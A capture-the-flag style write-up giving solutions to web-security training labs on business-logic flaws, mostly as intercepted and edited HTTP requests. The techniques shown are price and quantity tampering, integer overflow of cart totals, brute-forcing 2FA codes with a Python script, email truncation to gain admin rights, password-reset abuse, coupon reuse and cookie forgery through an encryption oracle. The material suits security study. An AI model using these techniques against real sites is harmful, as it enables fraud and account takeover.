# Business logic vulnerabilities

### Lab: Excessive trust in client-side controls

Task: Buy jacket with only $100 in your account

Solution: Intercept and edit request

Original Burp Request

```
POST /cart HTTP/1.1
Host: 0af200d8035192bfc08caf6400de00c9.web-security-academy.net
Cookie: session=fFbRXh3i0mombxzLn4NckWQkSaFPa6N5
Content-Length: 49
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0af200d8035192bfc08caf6400de00c9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0af200d8035192bfc08caf6400de00c9.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

productId=1&redir=PRODUCT&quantity=1&price=133700
```

Edited Burp Request

```
POST /cart HTTP/1.1
Host: 0af200d8035192bfc08caf6400de00c9.web-security-academy.net
Cookie: session=fFbRXh3i0mombxzLn4NckWQkSaFPa6N5
Content-Length: 49
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0af200d8035192bfc08caf6400de00c9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0af200d8035192bfc08caf6400de00c9.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

productId=1&redir=PRODUCT&quantity=1&price=10
```

### Lab: 2FA broken logic

Task: Login as Carlos

Solution: Modify `verify=wiener` to `verify=carlos` to trigger email. Use Burp Suite/Python Script to brute force the `mfa-code`. For Burp Suite, use intruder sniper mode as we are using 1 target and 1 payload.

Burp Request which triggers 2FA

```
GET /login2 HTTP/1.1
Host: 0a03005804dd9faac0988b9c003900d2.web-security-academy.net
Cookie: verify=wiener; session=I2Cs61Q39VRpokDwBJY7meVzOgxr6hTq
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a03005804dd9faac0988b9c003900d2.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Python Script

```
# https://stackoverflow.com/questions/26615756/python-requests-module-sends-json-string-instead-of-x-www-form-urlencoded-param

import requests

brute_force = []

for i in range(10000):
  _string = str(i)
  if len(_string) < 4:
     _string = _string.zfill(4)
  brute_force.append(_string + "\n")
  
  '''
  data = {'mfa-code': _string}
  cookies = {"verify" : "carlos", "session": "7fwMHQxjtXUnWGx2XXLAA9EBjKA60Ug2"}
  url = 'https://0a03005804dd9faac0988b9c003900d2.web-security-academy.net/login2'
  r = requests.post(url,cookies=cookies,data=data)
  if "Incorrect security code" not in r.text:
    print("correct! " + _string)
  else:
    print("wrong")
  '''

f = open("payload2.txt", "w")
f.writelines(brute_force)
f.close()
```

### Lab: High-level logic vulnerability

Task: Buy jacket with only $100 in your account

Solution: Observe that we can set the quantity of items to add to cart as negative. Add negative 20 amount of Six Pack Beer Belt $63.50 and one positive amount of Lightweight "l33t" Leather Jacket $1337 which gives us a net total of 67 which we can affort. Note that although there is no validation for adding negative amounts of an item, there is validation for purchasing items whose total add up to a negative amount. 

Burp Request for -20 Six Pack Beer Belt

```
POST /cart HTTP/1.1
Host: 0a4f00e304439956c0fd6400000a00e8.web-security-academy.net
Cookie: session=LdvaegtxiDbH7IhtGlZpaZ0Iqb2fPRwY
Content-Length: 36
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a4f00e304439956c0fd6400000a00e8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4f00e304439956c0fd6400000a00e8.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

productId=3&redir=PRODUCT&quantity=-20
```

Burp Request for 1 Lightweight "l33t" Leather Jacket

```
POST /cart HTTP/1.1
Host: 0a4f00e304439956c0fd6400000a00e8.web-security-academy.net
Cookie: session=LdvaegtxiDbH7IhtGlZpaZ0Iqb2fPRwY
Content-Length: 36
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a4f00e304439956c0fd6400000a00e8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4f00e304439956c0fd6400000a00e8.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

productId=1&redir=PRODUCT&quantity=1
```

### Lab: Low-level logic flaw

Task: Buy jacket with only $100 in your account

Solution: Observe that we can only add between 0 - 99 of a item per request using Burp. However, if we manage to add too many quantity of an item, to a point where by it reaches the maximum value of a programming language, we may cause an [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow) and cause it to jump from the maximum value to the minimum value. Using this, we can then control the number of times we add '99' quantities of an item such that the resulting total cost of the request would be less than 100. We will use Burp sniper intruder, null payload as we are not using any payloads. Configure resource pool to slow down the rate of requests along with the number of payloads (e.g. indefinitely or a fixed value) to send in order to get the correct amount of requests to make such that we get a value below 100.

- At around 200 requests, value becomes negative

- 330 iterations of 99 Lightweight "l33t" Leather Jackets added using Burp Suite Sniper Intruder, Null Payload

- 2 * 99 Lightweight "l33t" Leather Jackets added manually

- 1 * 49 Lightweight "l33t" Leather Jackets added manually

- 1 * 18 Babbage Web Spray added manually

Burp Request for quickly adding items to cart to cause integer overflow

```
POST /cart HTTP/1.1
Host: 0a4f009103f2d7c0d162ff6e0040000c.web-security-academy.net
Cookie: session=Y73ykNQcXlfBt8vHN8xnrrgA3VN1MH7R
Content-Length: 36
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a4f009103f2d7c0d162ff6e0040000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4f009103f2d7c0d162ff6e0040000c.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

productId=1&redir=PRODUCT&quantity=99
```

### Lab: Inconsistent handling of exceptional input

Task: Login as admin and delete Carlos

Solution: Maximum length of email string stored and recognised is 255. Try registering for an email with more than 255 characters and see what happens. Make use of the given email server. `@dontwannacry.com` is 17 characters long. Hence, you account name of your email address should be 238 characters long. Since our email server can receive mails from subdomains as well, then we can just pad `dontwannacry.com.` in front of it such that we receive the account activation email in our mail server. When we log in to our created email, we see that it only reads the first 255 characters of our registered email address, and if it ends with `@dontwannacry.com`, then the server will treat us as an admin!

Email Address: `CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net`

### Lab: Inconsistent security controls

Task: Login as admin and delete Carlos

Discover `/admin`: Target -> Sitemap -> Right-click on URL -> Engagement Tools -> Discover Content

Solution: Create an email with the given email domain server to activate account and confirm registration. Login as that user. Change registered email to one which ends with `@dontwannacry.com`.

### Lab: Weak isolation on dual-use endpoint

Task: Login as admin and delete Carlos

Solution: Remove `current-password` field, and realise that the application does not verify if current password is correct or not. Set username field to administrator to set new password for administrator.

Burp Request

```
POST /my-account/change-password HTTP/1.1
Host: 0a6d002f03bc7293c0324a2e00160028.web-security-academy.net
Cookie: session=QiJ05qRScVAls6lytWdqshXWWn2Z9TEE
Content-Length: 112
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a6d002f03bc7293c0324a2e00160028.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6d002f03bc7293c0324a2e00160028.web-security-academy.net/my-account/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

csrf=eHwgfkgnQ0t3ndpNKTLS1joHlpbKj949&username=administrator&new-password-1=asd&new-password-2=asd
```

### Lab: Password reset broken logic

Task: Reset Carlos password and login

Solution: Obtain a password reset link, reset the password but for Carlos instead of yourself by changing the username field

```
POST /forgot-password?temp-forgot-password-token=8tlIagWDbUIpstEYGp6s6PTUE4aNAiUa HTTP/1.1
Host: 0a01005304e233ccc0445cb9006700e3.web-security-academy.net
Cookie: session=WztvCnfdCGcH71IfDuxid88OyWbqjCUq
Content-Length: 113
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a01005304e233ccc0445cb9006700e3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a01005304e233ccc0445cb9006700e3.web-security-academy.net/forgot-password?temp-forgot-password-token=8tlIagWDbUIpstEYGp6s6PTUE4aNAiUa
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

temp-forgot-password-token=8tlIagWDbUIpstEYGp6s6PTUE4aNAiUa&username=carlos&new-password-1=asd&new-password-2=asd
```

### Lab: 2FA simple bypass

Task: Login as Carlos given that you have his credentials

Solution: Skip the OTP authentication by changing URL to `/my-account` when you reach the OTP verification page.

### Lab: Insufficient workflow validation

Task: Buy jacket with only $100 in your account

Solution: On the checkout page, press "place orders". Change request to `GET /cart/order-confirmation?order-confirmation=true`. You can also just change the URL to `/cart/order-confirmation?order-confirmation=true` on the checkout page.

### Lab: Authentication bypass via flawed state machine

Task: Login as admin and delete Carlos

Solution: After authentication, when Burp intercepts the request to `/role-selector`, DROP that request, don't try to accept and render that request (exploit will fail). After that, manually go to base path `/`. Or you can manually clear and forward a blank request, before manually going to the base path. Application by default authenticates user as admin if role selector is not done properly.

### Lab: Flawed enforcement of business rules

Task: Buy jacket with only $100 in your account

Solution: First coupon `NEWCUST5` given. Sign up for newsletter to get second coupon `SIGNUP30`. Alternate between 2 coupons to allow reuse.

### Lab: Infinite money logic flaw

Task: Buy jacket with only $100 in your account

Solution: Buy gift cards with coupons and claim them. You can net gain $3. Run it infinitely using Burp Suite macros. Can use python as well.

Notes: Run one request at a time because the macro needs to run FULLY & SEQUENTIALLY. Cannot be ran concurrently.

### Lab: Authentication bypass via encryption oracle

Task: Login as admin and delete Carlos

Solution:

- `stay-logged-in` cookie stores encrypted user information (username:timestamp)

- `notification` cookie stores encrypted invalid email address given which is decrypted server side

- `stay-logged-in` and `notification` cookies are encrypted and decrypted with the same key

- Longer invalid email address results in longer `notification` cookie

- Decode as URL &rarr; Decode as base64 &rarr; Delete 23 bytes (length of "invalid email address: ") &rarr; Encode as base64 &rarr; Encode as URL

- Add 9 bytes in front of adminstrator:timestamp

- Decode as URL &rarr; Decode as base64 &rarr; Delete 32 bytes (length of "invalid email address: ") &rarr; Encode as base64 &rarr; Encode as URL

- Obtain encoded adminstrator:timestamp cookie

- Set obtained administrator cookie to `stay-logged-in` cookie




